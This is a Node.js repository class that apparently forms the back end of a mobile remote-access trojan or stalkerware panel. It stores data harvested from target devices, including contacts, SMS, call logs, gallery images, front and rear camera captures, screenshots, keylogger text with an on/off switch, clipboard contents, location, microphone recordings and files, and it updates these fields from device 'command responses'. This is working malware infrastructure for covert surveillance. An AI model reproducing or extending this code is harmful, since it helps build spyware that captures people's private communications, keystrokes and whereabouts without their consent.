/**
 * Device Data Repository - Prisma implementation with in-memory fallback
 */

const { PrismaClient } = require('@prisma/client');
const logger = require('../utils/logger');

class DeviceDataRepository {
  constructor(prismaClient) {
    this.prisma = prismaClient || new PrismaClient();
    this.useDatabase = true;
    this.deviceData = new Map();
  }

  /**
   * Initialize database connection
   */
  async init() {
    try {
      await this.prisma.$queryRaw`SELECT 1`;
      this.useDatabase = true;
      logger.info('DeviceDataRepository: Using Prisma/PostgreSQL');
    } catch (error) {
      logger.warn('DeviceDataRepository: Database not available, using in-memory storage');
      this.deviceData = new Map();
      this.useDatabase = false;
    }
  }

  /**
   * Get default device data structure
   */
  getDefaultData(deviceId) {
    return {
      deviceId,
      contacts: [],
      sms: [],
      calls: [],
      gallery: [],
      camera: {
        main: [],
        selfie: [],
      },
      screenshots: [],
      keylogger: {
        enabled: false,
        data: [],
      },
      clipboard: '',
      location: null,
      apps: [],
      files: [],
      microphone: [],
      audio: {
        playing: false,
        current: null,
      },
    };
  }

  /**
   * Find device data by device ID
   */
  async findByDeviceId(deviceId) {
    try {
      if (this.useDatabase) {
        const records = await this.prisma.deviceData.findMany({
          where: { deviceId },
        });

        if (records.length === 0) {
          return null;
        }

        const deviceData = this.getDefaultData(deviceId);

        for (const record of records) {
          const dataType = record.dataType;
          const data = record.data;

          if (dataType === 'main') {
            deviceData.camera.main = Array.isArray(data) ? data : [];
          } else if (dataType === 'selfie') {
            deviceData.camera.selfie = Array.isArray(data) ? data : [];
          } else if (dataType === 'keylogger') {
            deviceData.keylogger = data || { enabled: false, data: [] };
          } else if (dataType === 'keylogger-status') {
            deviceData.keylogger.enabled = data?.enabled || false;
          } else if (dataType in deviceData) {
            deviceData[dataType] = data;
          }
        }

        return deviceData;
      }

      return this.deviceData.get(deviceId) || null;
    } catch (error) {
      logger.error(`Error finding device data ${deviceId}:`, error);
      throw error;
    }
  }

  async upsertData(deviceId, dataType, value, metadata = {}) {
    await this.prisma.deviceData.upsert({
      where: {
        deviceId_dataType: {
          deviceId,
          dataType,
        },
      },
      update: {
        data: value,
        metadata,
        capturedAt: new Date(),
      },
      create: {
        deviceId,
        dataType,
        data: value,
        metadata,
      },
    });
  }

  /**
   * Create device data
   */
  async create(data) {
    try {
      if (this.useDatabase) {
        const payload = {
          contacts: data.contacts,
          sms: data.sms,
          calls: data.calls,
          gallery: data.gallery,
          screenshots: data.screenshots,
          clipboard: data.clipboard,
          location: data.location,
          apps: data.apps,
          files: data.files,
          microphone: data.microphone,
          audio: data.audio,
        };

        for (const [key, value] of Object.entries(payload)) {
          if (value !== undefined) {
            await this.upsertData(data.deviceId, key, value);
          }
        }

        if (data.camera) {
          if (data.camera.main !== undefined) {
            await this.upsertData(data.deviceId, 'main', data.camera.main);
          }
          if (data.camera.selfie !== undefined) {
            await this.upsertData(data.deviceId, 'selfie', data.camera.selfie);
          }
        }

        if (data.keylogger !== undefined) {
          await this.upsertData(data.deviceId, 'keylogger', data.keylogger);
        }

        return await this.findByDeviceId(data.deviceId);
      }

      this.deviceData.set(data.deviceId, {
        ...data,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });
      return this.deviceData.get(data.deviceId);
    } catch (error) {
      logger.error(`Error creating device data ${data.deviceId}:`, error);
      throw error;
    }
  }

  /**
   * Update device data by type
   */
  async updateByType(deviceId, type, payload) {
    try {
      if (this.useDatabase) {
        let dataToStore = payload;

        // Handle special cases
        if (type === 'main-camera' || type === 'selfie-camera') {
          // Get existing array and append
          const cameraType = type === 'main-camera' ? 'main' : 'selfie';
          const existing = await this.prisma.deviceData.findUnique({
            where: {
              deviceId_dataType: {
                deviceId,
                dataType: cameraType,
              },
            },
          });

          let cameraArray = Array.isArray(existing?.data) ? existing.data : [];
          if (payload) {
            cameraArray = [
              ...cameraArray,
              {
                image: payload,
                timestamp: new Date().toISOString(),
              },
            ];
          }

          dataToStore = cameraArray;
          type = cameraType;
        } else if (type === 'screenshot') {
          // Get existing array and append
          const existing = await this.prisma.deviceData.findUnique({
            where: {
              deviceId_dataType: {
                deviceId,
                dataType: 'screenshots',
              },
            },
          });

          let screenshots = Array.isArray(existing?.data) ? existing.data : [];
          if (payload) {
            screenshots = [
              ...screenshots,
              {
                image: payload,
                timestamp: new Date().toISOString(),
              },
            ];
          }

          dataToStore = screenshots;
          type = 'screenshots';
        } else if (type === 'keylogger') {
          // Get existing array and append
          const existing = await this.prisma.deviceData.findUnique({
            where: {
              deviceId_dataType: {
                deviceId,
                dataType: 'keylogger',
              },
            },
          });

          let keyloggerData = existing?.data || { enabled: false, data: [] };
          if (!Array.isArray(keyloggerData.data)) {
            keyloggerData.data = [];
          }

          if (payload) {
            keyloggerData = {
              ...keyloggerData,
              data: [
                ...keyloggerData.data,
                {
                  text: payload,
                  timestamp: new Date().toISOString(),
                },
              ],
            };
          }

          dataToStore = keyloggerData;
        } else if (type === 'keylogger-status') {
          // Update keylogger enabled status
          const existing = await this.prisma.deviceData.findUnique({
            where: {
              deviceId_dataType: {
                deviceId,
                dataType: 'keylogger',
              },
            },
          });

          let keyloggerData = existing?.data || { enabled: false, data: [] };
          keyloggerData.enabled = payload?.enabled || payload === true || payload === 'true';
          dataToStore = keyloggerData;
          type = 'keylogger';
        } else if (type === 'file') {
          // Get existing array and append
          const existing = await this.prisma.deviceData.findUnique({
            where: {
              deviceId_dataType: {
                deviceId,
                dataType: 'files',
              },
            },
          });

          let files = Array.isArray(existing?.data) ? existing.data : [];
          if (payload) {
            files = [
              ...files,
              {
                name: payload.name,
                data: payload.data,
                timestamp: new Date().toISOString(),
              },
            ];
          }

          dataToStore = files;
          type = 'files';
        } else if (!Array.isArray(payload) && typeof payload !== 'object') {
          // Simple value (string, number, etc.)
          dataToStore = payload;
        }

        await this.upsertData(deviceId, type, dataToStore);

        return await this.findByDeviceId(deviceId);
      }

      // In-memory implementation (fallback)
      let data = this.deviceData.get(deviceId);

      if (!data) {
        data = this.getDefaultData(deviceId);
      }

      // Update based on type (same logic as before)
      switch (type) {
        case 'contacts':
          data.contacts = Array.isArray(payload) ? payload : [];
          break;
        case 'sms':
          data.sms = Array.isArray(payload) ? payload : [];
          break;
        case 'calls':
          data.calls = Array.isArray(payload) ? payload : [];
          break;
        case 'gallery':
          data.gallery = Array.isArray(payload) ? payload : [];
          break;
        case 'main-camera':
          if (payload) {
            data.camera.main.push({
              image: payload,
              timestamp: new Date().toISOString(),
            });
          }
          break;
        case 'selfie-camera':
          if (payload) {
            data.camera.selfie.push({
              image: payload,
              timestamp: new Date().toISOString(),
            });
          }
          break;
        case 'screenshot':
          if (payload) {
            data.screenshots.push({
              image: payload,
              timestamp: new Date().toISOString(),
            });
          }
          break;
        case 'keylogger':
          if (payload) {
            data.keylogger.data.push({
              text: payload,
              timestamp: new Date().toISOString(),
            });
          }
          break;
        case 'keylogger-status':
          data.keylogger.enabled = payload?.enabled || payload === true || payload === 'true';
          break;
        case 'clipboard':
          data.clipboard = payload || '';
          break;
        case 'location':
          data.location = payload;
          break;
        case 'apps':
          data.apps = Array.isArray(payload) ? payload : [];
          break;
        case 'file':
          if (payload) {
            data.files.push({
              name: payload.name,
              data: payload.data,
              timestamp: new Date().toISOString(),
            });
          }
          break;
      }

      data.updatedAt = new Date().toISOString();
      this.deviceData.set(deviceId, data);
      return data;
    } catch (error) {
      logger.error(`Error updating device data ${deviceId} type ${type}:`, error);
      throw error;
    }
  }

  /**
   * Update device data from command response
   */
  async updateFromResponse(deviceId, request, result) {
    try {
      if (this.useDatabase) {
        // Map request types to data types
        const typeMap = {
          'contacts': 'contacts',
          'sms': 'sms',
          'calls': 'calls',
          'gallery': 'gallery',
          'apps': 'apps',
          'clipboard': 'clipboard',
          'location': 'location',
        };

        if (result && typeof result === 'object') {
          for (const [requestType, dataType] of Object.entries(typeMap)) {
            if (request === requestType && result[dataType] !== undefined) {
              await this.upsertData(deviceId, dataType, result[dataType]);
            }
          }
        }

        return await this.findByDeviceId(deviceId);
      }

      // In-memory implementation
      let data = this.deviceData.get(deviceId);

      if (!data) {
        data = this.getDefaultData(deviceId);
      }

      if (result && typeof result === 'object') {
        if (request === 'contacts' && result.contacts) {
          data.contacts = result.contacts;
        } else if (request === 'sms' && result.sms) {
          data.sms = result.sms;
        } else if (request === 'calls' && result.calls) {
          data.calls = result.calls;
        } else if (request === 'gallery' && result.gallery) {
          data.gallery = result.gallery;
        } else if (request === 'apps' && result.apps) {
          data.apps = result.apps;
        } else if (request === 'clipboard' && result.clipboard !== undefined) {
          data.clipboard = result.clipboard;
        } else if (request === 'location' && result.location) {
          data.location = result.location;
        }
      }

      data.updatedAt = new Date().toISOString();
      this.deviceData.set(deviceId, data);
      return data;
    } catch (error) {
      logger.error(`Error updating device data from response ${deviceId}:`, error);
      throw error;
    }
  }

  /**
   * Add file to device data
   */
  async addFile(deviceId, fileData) {
    try {
      if (this.useDatabase) {
        const existing = await this.prisma.deviceData.findUnique({
          where: {
            deviceId_dataType: {
              deviceId,
              dataType: 'files',
            },
          },
        });

        const files = Array.isArray(existing?.data) ? existing.data : [];
        files.push({
          name: fileData.name,
          path: fileData.path,
          size: fileData.size,
          uploadedAt: new Date().toISOString(),
        });

        await this.upsertData(deviceId, 'files', files);

        return await this.findByDeviceId(deviceId);
      }

      // In-memory implementation
      let data = this.deviceData.get(deviceId);

      if (!data) {
        data = this.getDefaultData(deviceId);
      }

      data.files.push({
        name: fileData.name,
        path: fileData.path,
        size: fileData.size,
        uploadedAt: new Date().toISOString(),
      });

      data.updatedAt = new Date().toISOString();
      this.deviceData.set(deviceId, data);
      return data;
    } catch (error) {
      logger.error(`Error adding file to device data ${deviceId}:`, error);
      throw error;
    }
  }

  /**
   * Delete device data
   */
  async delete(deviceId) {
    try {
      if (this.useDatabase) {
        await this.prisma.deviceData.deleteMany({
          where: { deviceId },
        });
        return true;
      }

      return this.deviceData.delete(deviceId);
    } catch (error) {
      logger.error(`Error deleting device data ${deviceId}:`, error);
      throw error;
    }
  }
}

module.exports = DeviceDataRepository;
